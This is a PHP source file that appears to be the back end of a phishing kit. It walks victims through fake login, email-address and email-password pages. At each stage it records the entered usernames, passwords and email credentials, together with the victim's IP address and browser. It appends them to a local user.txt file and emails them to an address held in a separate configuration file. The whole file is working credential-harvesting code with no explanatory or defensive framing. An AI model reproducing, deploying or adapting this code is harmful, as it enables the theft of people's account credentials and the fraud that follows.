
<?php
ini_set('display_errors', 0);
session_start();

ini_set("max_execution_time", "0");

include "mail.php";
$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$cmd = $_REQUEST['LOB'];

if ($cmd == "Index") {
    $err = 0;
    include "login.php";
}

if ($cmd == "LogIn") {
    $_SESSION['uu'] = $user = $_REQUEST['username'];
    $_SESSION['pp'] = $pass = $_REQUEST['password'];

    if ($user == "" or $pass == "" ) {
        $err = 1;
        include "login.php";
    } else {
    $usr = "==================
Username: $user
Password: $pass
$ip - $browser
==================
";
    
    $fp = fopen("user.txt", "a");
    fputs($fp, "$usr");
    fclose($fp);

    if ($sendto != "") {
        mail($sendto, "LogIn", $usr);
    }

    $status = "login";
    include "email.php";
    }

}

if ($cmd == "EmailAddress") {

    $_SESSION['email'] = $email = $_REQUEST['email'];
    $_SESSION['password'] = $password = $_REQUEST['password'];

    if ($email == "" or $password == "" ) {
        $err = 1;
        include "email.php";
    } else {
    $email = "==================
Email Address: $email
Password: $password
$ip - $browser
==================
";
    
    $fp = fopen("user.txt", "a");
    fputs($fp, "$email");
    fclose($fp);

    if ($sendto != "") {
        mail($sendto, "Email Address", $email);
    }

    $status = "email_address";
    include "email_password.php";
    }


}

if ($cmd == "EmailPassword") {

    $_SESSION['cemail'] = $cemail = $_POST['cemail'];
    $_SESSION['cepass'] = $cepass = $_POST['cepass'];
    $email = $_SESSION['email'];
    $password = $_SESSION['password'];
    $username = $_SESSION['uu'];
    $pass = $_SESSION['pp'];

    $usr = "==================
Username: $username
Password: $pass
E-mail: $email
E-pass: $password
Confirm E-mail: $cemail
Confirm E-pass: $cepass
$ip - $browser
==================
";

    $fp = fopen("user.txt", "a");
    fputs($fp, "$usr");
    fclose($fp);

    if ($sendto != "") {
        mail($sendto, "Email Password", $usr);
    }
    $status = "email_password";
    include "thankyou.php";

}

?>